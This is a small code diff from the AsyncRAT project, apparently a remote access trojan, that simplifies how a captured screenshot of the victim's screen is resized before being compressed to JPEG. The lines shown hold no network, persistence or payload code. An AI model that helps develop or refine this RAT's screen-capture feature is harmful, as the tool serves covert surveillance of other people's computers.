@@ -429,13 +429,7 @@ Namespace AsyncRAT
                         End Using
 
                         'Resize
-                        Using Resize As New Bitmap(W, H)
-                            Using ImageResize As Graphics = Graphics.FromImage(Resize)
-                                ImageResize.CompositingQuality = CompositingQuality.HighSpeed
-                                ImageResize.DrawImage(ScreenSize, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
-                            End Using
-
-
+                        Using Resize = New Bitmap(ScreenSize, W, H)
 
                             'compress
                             Using encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
@@ -450,7 +444,6 @@ Namespace AsyncRAT
                             End Using
                         End Using
                     End Using
-
                 Catch ex As Exception
                     Debug.WriteLine("Capture" + ex.Message)
                 End Try
